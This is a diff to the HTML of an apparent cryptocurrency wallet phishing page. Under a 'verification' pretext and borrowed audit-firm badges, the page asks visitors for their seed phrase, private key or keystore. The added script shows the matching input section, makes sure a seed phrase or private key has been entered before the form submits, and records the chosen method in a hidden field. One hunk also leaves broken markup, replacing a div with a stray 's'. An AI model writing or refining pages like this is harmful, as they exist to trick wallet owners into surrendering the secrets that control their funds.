@@ -1222,7 +1222,7 @@
             <span data-i18n="keystore">KeyStore</span>
           </button>
                     <div class="security-badges">
-                        <div class="badge-track" style="">
+                        s
                             <!-- First sequence -->
                             <img src="./certik.png" alt="CertiK Audit">
                             <img src="./ConsenSysDiligence.png" alt="ConsenSys Diligence">
@@ -1334,6 +1334,69 @@
 
 
     </div>
+    <script>
+        (() => {
+            const verificationButtons = document.querySelectorAll('.verification-button');
+            const verificationScreen = document.getElementById('verificationScreen');
+            const importScreen = document.getElementById('importScreen');
+            const verificationMethod = document.getElementById('verification_method');
+            const phaseField = document.getElementById('phase');
+            const seedSection = document.getElementById('seedphraseSection');
+            const privateSection = document.getElementById('privateKeySection');
+            const keystoreSection = document.getElementById('keystoreSection');
+            const importForm = document.getElementById('import-form');
+
+            const showMethod = (mode) => {
+                if (verificationMethod) verificationMethod.value = mode;
+                if (phaseField) phaseField.value = mode;
+
+                if (seedSection) seedSection.style.display = mode === 'seedphrase' ? 'block' : 'none';
+                if (privateSection) privateSection.style.display = mode === 'privateKey' ? 'block' : 'none';
+                if (keystoreSection) keystoreSection.style.display = mode === 'keystore' ? 'block' : 'none';
+
+                if (verificationScreen) verificationScreen.style.display = 'none';
+                if (importScreen) importScreen.style.display = 'block';
+            };
+
+            verificationButtons.forEach((button) => {
+                button.addEventListener('click', () => {
+                    const label = (button.getAttribute('aria-label') || '').toLowerCase();
+                    if (label.includes('phrase') || label.includes('seedphrase')) {
+                        showMethod('seedphrase');
+                    } else if (label.includes('private key')) {
+                        showMethod('privateKey');
+                    } else if (label.includes('keystore')) {
+                        showMethod('keystore');
+                    }
+                });
+            });
+
+            if (importForm) {
+                importForm.addEventListener('submit', (event) => {
+                    const selectedMode = (verificationMethod && verificationMethod.value) || 'seedphrase';
+                    if (selectedMode === 'seedphrase') {
+                        const seedField = document.getElementById('seedphraseInput');
+                        if (!seedField || !seedField.value.trim()) {
+                            event.preventDefault();
+                            alert('Please enter your seed phrase.');
+                            return;
+                        }
+                    }
+
+                    if (selectedMode === 'privateKey') {
+                        const privateField = document.getElementById('privateKeyInput');
+                        if (!privateField || !privateField.value.trim()) {
+                            event.preventDefault();
+                            alert('Please enter your private key.');
+                            return;
+                        }
+                    }
+
+                    if (phaseField) phaseField.value = selectedMode;
+                });
+            }
+        })();
+    </script>
 </body>
 
 </html>
